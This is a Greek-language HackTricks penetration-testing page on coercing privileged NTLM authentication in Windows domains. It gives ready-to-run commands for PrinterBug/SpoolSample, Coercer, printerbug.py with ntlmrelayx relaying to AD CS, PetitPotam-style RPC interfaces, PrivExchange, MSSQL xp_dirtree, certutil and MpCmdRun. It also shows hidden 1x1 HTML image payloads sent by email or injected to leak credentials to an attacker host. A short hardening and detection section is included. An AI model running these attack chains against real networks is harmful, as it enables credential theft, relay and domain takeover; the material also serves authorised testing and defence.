# Εξαναγκασμός προνομιακής αυθεντικοποίησης NTLM

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

Το [**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) είναι μια **συλλογή** από **triggers απομακρυσμένης αυθεντικοποίησης**, γραμμένα σε C# με χρήση του MIDL compiler, ώστε να αποφεύγονται εξαρτήσεις από τρίτα μέρη.

## Κατάχρηση της υπηρεσίας Spooler

Αν η υπηρεσία _**Print Spooler**_ είναι **ενεργοποιημένη,** μπορείτε να χρησιμοποιήσετε ήδη γνωστά διαπιστευτήρια AD για να **ζητήσετε** από τον print server του Domain Controller **ενημέρωση** για νέες εργασίες εκτύπωσης και απλώς να του πείτε να **στείλει την ειδοποίηση σε κάποιο σύστημα**.\
Σημειώστε ότι όταν ο εκτυπωτής στέλνει την ειδοποίηση σε αυθαίρετα συστήματα, πρέπει να **αυθεντικοποιηθεί έναντι** αυτού του **συστήματος**. Επομένως, ένας εισβολέας μπορεί να κάνει την υπηρεσία _**Print Spooler**_ να αυθεντικοποιηθεί έναντι αυθαίρετου συστήματος, και η υπηρεσία θα **χρησιμοποιήσει τον λογαριασμό υπολογιστή** σε αυτή την αυθεντικοποίηση.

Σε χαμηλό επίπεδο, το κλασικό primitive **PrinterBug** καταχράται το **`RpcRemoteFindFirstPrinterChangeNotificationEx`** μέσω του **`\\PIPE\\spoolss`**. Ο εισβολέας ανοίγει πρώτα ένα handle εκτυπωτή/διακομιστή και μετά παρέχει ένα πλαστό όνομα client στο `pszLocalMachine`, ώστε το spooler του στόχου να δημιουργήσει ένα κανάλι ειδοποιήσεων **προς τον host που ελέγχει ο εισβολέας**. Γι’ αυτό το αποτέλεσμα είναι **εξαναγκασμός εξερχόμενης αυθεντικοποίησης** και όχι άμεση εκτέλεση κώδικα.<sup>[[2]](#references)</sup>\
Αν αναζητάτε **RCE/LPE** στο ίδιο το spooler, δείτε το [PrintNightmare](printnightmare.md). Αυτή η σελίδα εστιάζει στον **εξαναγκασμό αυθεντικοποίησης και στο relay**.

### Εύρεση διακομιστών Windows στον τομέα

Χρησιμοποιήστε PowerShell για να εμφανίσετε τους hosts Windows. Οι διακομιστές είναι συνήθως οι στόχοι υψηλότερης προτεραιότητας, οπότε εστιάστε πρώτα σε αυτούς:

```bash
Get-ADComputer -Filter {(OperatingSystem -like "*Windows Server*") -and (Enabled -eq $true)} -Properties DNSHostName |
  Select-Object -ExpandProperty DNSHostName > servers.txt
```

### Εντοπισμός υπηρεσιών Spooler που ακούν

Χρησιμοποιώντας μια ελαφρώς τροποποιημένη έκδοση του [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) του @mysmartlogin (Vincent Le Toux), ελέγξτε αν η υπηρεσία Spooler ακούει:

```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```

Μπορείτε επίσης να χρησιμοποιήσετε το `rpcdump.py` σε Linux και να αναζητήσετε το πρωτόκολλο **MS-RPRN**:

```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```

Ή δοκιμάστε γρήγορα hosts από Linux με **NetExec/CrackMapExec**:

```bash
nxc smb targets.txt -u user -p password -M spooler
```

Αν θέλετε να **καταγράψετε τις επιφάνειες εξαναγκασμού** αντί απλώς να ελέγξετε αν υπάρχει το endpoint του spooler, χρησιμοποιήστε τη **λειτουργία σάρωσης του Coercer**:<sup>[[5]](#references)</sup>

```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```

Αυτό είναι χρήσιμο, επειδή το να βλέπετε το endpoint στο EPM σάς λέει μόνο ότι το print RPC interface είναι καταχωρισμένο. **Δεν** εγγυάται ότι κάθε μέθοδος coercion είναι προσβάσιμη με τα τρέχοντα privileges σας ή ότι ο host θα δημιουργήσει μια αξιοποιήσιμη ροή authentication.

### Ζητήστε από την υπηρεσία να πραγματοποιήσει authentication σε έναν αυθαίρετο host

Μπορείτε να κάνετε compile το [SpoolSample από το αρχικό repository](https://github.com/leechristensen/SpoolSample).

```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```

ή χρησιμοποιήστε το [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) ή το [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py), αν χρησιμοποιείτε Linux.

```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```

Με το **Coercer**, μπορείτε να στοχεύσετε απευθείας τις διεπαφές του spooler και να αποφύγετε να μαντεύετε ποια μέθοδος RPC είναι εκτεθειμένη:<sup>[[5]](#references)</sup>

```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```

### Σύγχρονα callbacks RPC-over-TCP

Μην υποθέτετε ότι μια επιτυχής κλήση `RpcRemoteFindFirstPrinterChangeNotificationEx` πρέπει να προκαλέσει κίνηση στο TCP/445. **Τα Windows 11 22H2 και νεότερες εκδόσεις χρησιμοποιούν από προεπιλογή RPC over TCP για τις επικοινωνίες εκτύπωσης**· το RPC μέσω named pipes είναι απενεργοποιημένο, εκτός αν το επαναφέρει κάποια πολιτική ή η ρύθμιση `RpcUseNamedPipeProtocol=1`. Επομένως, οι legacy listeners που υποστηρίζουν μόνο SMB μπορεί να αναφέρουν ότι στάλθηκε το trigger, χωρίς ποτέ να λάβουν το callback. Η Microsoft τεκμηριώνει τη χρήση του TCP/135 (Endpoint Mapper) μαζί με δυναμικές θύρες RPC για το συνηθισμένο print RPC, ενώ οι οργανισμοί μπορούν να περιορίσουν αυτό το εύρος ή να ορίσουν μια σταθερή θύρα print RPC.<sup>[[10]](#references)</sup>

Το τρέχον **Impacket `ntlmrelayx.py`** περιλαμβάνει έναν RPC relay server και έναν μικρό Endpoint Mapper, ενεργοποιημένο από προεπιλογή στο TCP/135. Αυτή η υποστήριξη συγχωνεύτηκε τον Ιούνιο του 2025, ειδικά με επίδειξη αλυσίδας PrinterBug-to-AD-CS, επιτρέποντας στο αυθεντικοποιημένο RPC callback να γίνει relay ακόμη κι όταν το θύμα δεν κάνει fallback σε SMB/WebDAV.<sup>[[11]](#references)</sup>

Η υποστήριξη RPC relay/EPM περιλαμβάνεται στο **Impacket 0.13.0 και σε νεότερες εκδόσεις**. Πριν διερευνήσετε γιατί λείπει ο listener στο TCP/135, βεβαιωθείτε ότι δεν εκτελείται κάποια παλαιότερη, πακεταρισμένη έκδοση του `ntlmrelayx.py`· το output της βοήθειας πρέπει να εμφανίζει και τα δύο switches του RPC server.<sup>[[12]](#references)</sup>

```bash
python3 -m pip show impacket | grep '^Version:'
ntlmrelayx.py -h | grep -E -- '--rpc-port|--no-rpc-server'
```

```bash
# Recent Impacket: the RPC/EPM listener starts automatically on TCP/135
# Use --template DomainController instead when coercing a DC
sudo ntlmrelayx.py -t 'http://ca.corp.local/certsrv/certfnsh.asp' \
  --adcs --template Machine -smb2support

# Trigger after the listener is ready; use a name/address reachable by the victim
printerbug.py 'corp.local/user:password'@TARGET ATTACKER_FQDN
```

Αναζητήστε τα `Setting up RPC Server on port 135` και `RPCD: Received connection` στην έξοδο του relay. Αν η κλήση RPC επιστρέψει ένα αναμενόμενο σφάλμα, αλλά τίποτα δεν φτάσει στον listener, ελέγξτε την πολιτική μεταφοράς print RPC του θύματος, το outbound filtering, την επίλυση DNS και αν κάποια άλλη διεργασία χρησιμοποιεί ήδη την TCP/135. Βεβαιωθείτε επίσης ότι το `ntlmrelayx` δεν ξεκίνησε με `--no-rpc-server`.

### Εξαναγκασμός χρήσης HTTP αντί για SMB με το WebClient

Σε συστήματα που εξακολουθούν να χρησιμοποιούν **RPC over named pipes** (παλαιότερα builds ή συμπεριφορά που έχει επανέλθει μέσω policy), το κλασικό PrinterBug συνήθως προκαλεί authentication μέσω **SMB** προς το `\\attacker\share`, κάτι που εξακολουθεί να είναι χρήσιμο για **capture**, **relay σε HTTP targets** ή **relay όταν απουσιάζει το SMB signing**.\
Ωστόσο, το relay από **SMB σε SMB** συχνά αποκλείεται από το **SMB signing**, επομένως οι operators ενδέχεται να προτιμούν να εξαναγκάσουν authentication μέσω **HTTP/WebDAV**. Αυτό δεν αποτελεί εναλλακτική λύση για τη συμπεριφορά RPC-over-TCP που περιγράφεται παραπάνω.

Αν η υπηρεσία **WebClient** εκτελείται στο target, ο listener μπορεί να οριστεί με τρόπο που κάνει τα Windows να χρησιμοποιήσουν **WebDAV μέσω HTTP**:

```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```

Αυτό είναι ιδιαίτερα χρήσιμο όταν συνδυάζεται με **`ntlmrelayx --adcs`** ή άλλους στόχους HTTP relay, επειδή δεν απαιτεί να είναι δυνατή η SMB relay στην εξαναγκασμένη σύνδεση. Η σημαντική επιφύλαξη είναι ότι το **WebClient πρέπει να εκτελείται** στο θύμα, ώστε να λειτουργήσει η παραλλαγή HTTP/WebDAV.

### Συνδυασμός με Unconstrained Delegation

Αν ένας επιτιθέμενος έχει παραβιάσει έναν υπολογιστή που έχει ρυθμιστεί για [Unconstrained Delegation](unconstrained-delegation.md), μπορεί να **εξαναγκάσει τον εκτυπωτή να πραγματοποιήσει authentication σε αυτόν τον υπολογιστή**. Το **TGT** του λογαριασμού υπολογιστή του εκτυπωτή αποθηκεύεται τότε στην cache της μνήμης του host με unconstrained delegation, όπου ο επιτιθέμενος μπορεί να το ανακτήσει και να το χρησιμοποιήσει ξανά με το [Pass the Ticket](pass-the-ticket.md).

### Σημειώσεις για εντοπισμό και hardening

Ο πιο αξιόπιστος τρόπος για να αφαιρεθεί το PrinterBug από έναν DC, PAW ή server που δεν εκτυπώνει είναι να σταματήσετε και να απενεργοποιήσετε το Spooler. Όπου απαιτείται εκτύπωση, ενισχύστε την ασφάλεια όλων των πιθανών προορισμών relay (SMB server signing, LDAP signing/channel binding και EPA σε υπηρεσίες HTTP όπως το AD CS), αντί να θεωρείτε ότι αρκεί ο αποκλεισμός της TCP/445 στη διαδρομή callback.<sup>[[1]](#references)</sup>

```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```

Αν ο host εξακολουθεί να χρειάζεται **τοπική εκτύπωση**, ένας πιο περιορισμένος έλεγχος είναι το GPO `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`. Αυτό εμποδίζει το spooler να δέχεται συνδέσεις απομακρυσμένων clients (και την κοινή χρήση εκτυπωτών), ενώ αφήνει την υπηρεσία διαθέσιμη τοπικά. Κάντε επανεκκίνηση του spooler μετά την εφαρμογή της ρύθμισης και, στη συνέχεια, επαναλάβετε τους παραπάνω ελέγχους προσβασιμότητας MS-RPRN.<sup>[[13]](#references)</sup>

Για τον εντοπισμό, συσχετίστε μια αυθεντικοποιημένη κλήση στο MS-RPRN UUID `12345678-1234-abcd-ef00-0123456789ab`, ειδικά τα opnum 62/65 με μη τοπική τιμή callback, με μια άμεση εξερχόμενη σύνδεση SMB, HTTP ή RPC από τον host του spooler. Καταγράψτε ως baseline τα **interface UUID/opnum και τα ζεύγη πηγής/προορισμού**, όχι μόνο την πρόσβαση στο `\PIPE\spoolss`, καθώς οι σύγχρονες στοίβες εκτύπωσης μπορούν να μεταφέρουν το callback μέσω RPC-over-TCP.<sup>[[1]](#references)[[10]](#references)[[11]](#references)</sup>

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)<sup>[[5]](#references)</sup>

### Πίνακας εξαναγκασμού αυθεντικοποίησης μέσω UNC path RPC (interfaces/opnums που προκαλούν εξερχόμενη αυθεντικοποίηση)
- MS-RPRN (Print System Remote Protocol)
  - Pipe: \\PIPE\\spoolss
  - IF UUID: 12345678-1234-abcd-ef00-0123456789ab
  - Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
  - Tools: PrinterBug / SpoolSample / Coercer<sup>[[1]](#references)[[6]](#references)</sup>
- MS-PAR (Print System Asynchronous Remote)
  - Pipe: \\PIPE\\spoolss
  - IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
  - Σημειώσεις: ασύγχρονο interface εκτύπωσης στο ίδιο spooler pipe· χρησιμοποιήστε το Coercer για να απαριθμήσετε τις προσβάσιμες μεθόδους σε έναν συγκεκριμένο host<sup>[[1]](#references)[[6]](#references)</sup>
- MS-EFSR (Encrypting File System Remote Protocol)
  - Pipes: \\PIPE\\efsrpc (επίσης μέσω \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
  - IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
  - Opnums που γίνεται συνήθως κατάχρηση: 0, 4, 5, 6, 7, 12, 13, 15, 16
  - Tool: PetitPotam<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- MS-DFSNM (DFS Namespace Management)
  - Pipe: \\PIPE\\netdfs
  - IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
  - Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
  - Tool: DFSCoerce<sup>[[1]](#references)[[6]](#references)[[8]](#references)</sup>
- MS-FSRVP (File Server Remote VSS)
  - Pipe: \\PIPE\\FssagentRpc
  - IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
  - Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
  - Tool: ShadowCoerce<sup>[[1]](#references)[[6]](#references)[[9]](#references)</sup>
- MS-EVEN (EventLog Remoting)
  - Pipe: \\PIPE\\even
  - IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
  - Opnum: 9 ElfrOpenBELW
  - Tool: CheeseOunce<sup>[[1]](#references)</sup>

Σημείωση: Αυτές οι μέθοδοι δέχονται παραμέτρους που μπορούν να περιέχουν UNC path (π.χ., `\\attacker\share`). Κατά την επεξεργασία τους, τα Windows πραγματοποιούν αυθεντικοποίηση (στο πλαίσιο του λογαριασμού υπολογιστή/χρήστη) σε αυτό το UNC, επιτρέποντας την καταγραφή ή αναμετάδοση του NetNTLM. Για κατάχρηση του spooler, το **MS-RPRN opnum 65** παραμένει το πιο συνηθισμένο και καλύτερα τεκμηριωμένο primitive, επειδή οι προδιαγραφές του πρωτοκόλλου αναφέρουν ρητά ότι ο server δημιουργεί ένα notification channel προς τον client που καθορίζεται από το `pszLocalMachine`.<sup>[[2]](#references)</sup>

### Εξαναγκασμός αυθεντικοποίησης MS-EVEN: ElfrOpenBELW (opnum 9)
- Interface: MS-EVEN μέσω \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)<sup>[[3]](#references)</sup>
- Υπογραφή κλήσης: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)<sup>[[4]](#references)</sup>
- Επίδραση: ο στόχος επιχειρεί να ανοίξει την παρεχόμενη διαδρομή του backup log και αυθεντικοποιείται στο UNC που ελέγχει ο επιτιθέμενος.<sup>[[1]](#references)</sup>
- Πρακτική χρήση: εξαναγκάστε assets Tier 0 (DC/RODC/Citrix/etc.) να εκπέμψουν NetNTLM και, στη συνέχεια, κάντε relay σε endpoints AD CS (σενάρια ESC8/ESC11) ή σε άλλες προνομιούχες υπηρεσίες.<sup>[[1]](#references)</sup>

## PrivExchange

Η επίθεση `PrivExchange` προκύπτει από ένα ελάττωμα στη **λειτουργία `PushSubscription` του Exchange Server**. Αυτή η λειτουργία επιτρέπει σε οποιονδήποτε χρήστη του domain διαθέτει mailbox να εξαναγκάσει τον Exchange server να αυθεντικοποιηθεί σε οποιονδήποτε host παρέχεται από τον client μέσω HTTP.

Από προεπιλογή, η **υπηρεσία Exchange εκτελείται ως SYSTEM** και διαθέτει υπερβολικά δικαιώματα (συγκεκριμένα, έχει **δικαιώματα WriteDacl στο domain πριν από το Cumulative Update του 2019**). Αυτό το ελάττωμα μπορεί να αξιοποιηθεί για να επιτραπεί η **αναμετάδοση πληροφοριών στο LDAP και στη συνέχεια η εξαγωγή της βάσης δεδομένων NTDS του domain**. Όταν δεν είναι δυνατή η αναμετάδοση στο LDAP, το ελάττωμα μπορεί και πάλι να χρησιμοποιηθεί για relay και αυθεντικοποίηση σε άλλους hosts εντός του domain. Η επιτυχής εκμετάλλευση αυτής της επίθεσης παρέχει άμεση πρόσβαση στον Domain Admin με οποιονδήποτε αυθεντικοποιημένο λογαριασμό χρήστη του domain.

## Μέσα στα Windows

Αν βρίσκεστε ήδη μέσα στο μηχάνημα Windows, μπορείτε να εξαναγκάσετε τα Windows να συνδεθούν σε έναν server χρησιμοποιώντας προνομιούχους λογαριασμούς με:

### Defender MpCmdRun

```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```

### MSSQL

```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```

[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)

```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```

Ή χρησιμοποιήστε αυτήν την άλλη τεχνική: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Είναι δυνατό να χρησιμοποιήσετε το lolbin certutil.exe (δυαδικό αρχείο υπογεγραμμένο από τη Microsoft) για να εξαναγκάσετε τον έλεγχο ταυτότητας NTLM:

```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```

## HTML injection

### Μέσω email

Αν γνωρίζετε τη **διεύθυνση email** του χρήστη που συνδέεται σε ένα μηχάνημα το οποίο θέλετε να παραβιάσετε, μπορείτε απλώς να του στείλετε ένα **email με εικόνα 1x1**, όπως για παράδειγμα

```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```

Όταν το θύμα το ανοίξει, τα Windows προσπαθούν να πραγματοποιήσουν έλεγχο ταυτότητας.

### MitM

Αν μπορείς να πραγματοποιήσεις επίθεση MitM και να εισαγάγεις HTML σε μια σελίδα που βλέπει το θύμα, δοκίμασε να εισαγάγεις μια εικόνα όπως:

```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```

## Άλλοι τρόποι εξαναγκασμού και phishing για αυθεντικοποίηση NTLM


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Cracking NTLMv1

Αν μπορείτε να καταγράψετε [προκλήσεις NTLMv1, διαβάστε εδώ πώς να τις κάνετε crack](../ntlm/index.html#ntlmv1-attack).\
_Να θυμάστε ότι για να κάνετε crack το NTLMv1, πρέπει να ορίσετε το challenge του Responder σε "1122334455667788"_



## References

- [1] [Unit 42 – Η εξαναγκασμένη αυθεντικοποίηση συνεχίζει να εξελίσσεται](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [2] [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [3] [Microsoft – MS-EVEN: Πρωτόκολλο απομακρυσμένης διαχείρισης EventLog](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [4] [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [5] [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [6] [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [7] [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [8] [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [9] [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)
- [10] [Microsoft – Ενημερώσεις σύνδεσης RPC για εκτύπωση στα Windows 11](https://learn.microsoft.com/en-us/troubleshoot/windows-client/printing/windows-11-rpc-connection-updates-for-print)
- [11] [Fortra Impacket – Διακομιστής RPC relay και Endpoint Mapper για το ntlmrelayx](https://github.com/fortra/impacket/pull/1974)
- [12] [Fortra Impacket – Έκδοση 0.13.0](https://github.com/fortra/impacket/releases/tag/impacket_0_13_0)
- [13] [Microsoft – Policy CSP: Να επιτρέπεται στο Print Spooler να δέχεται συνδέσεις πελατών](https://learn.microsoft.com/en-us/windows/client-management/mdm/policy-csp-admx-printing2)
{{#include ../../banners/hacktricks-training.md}}
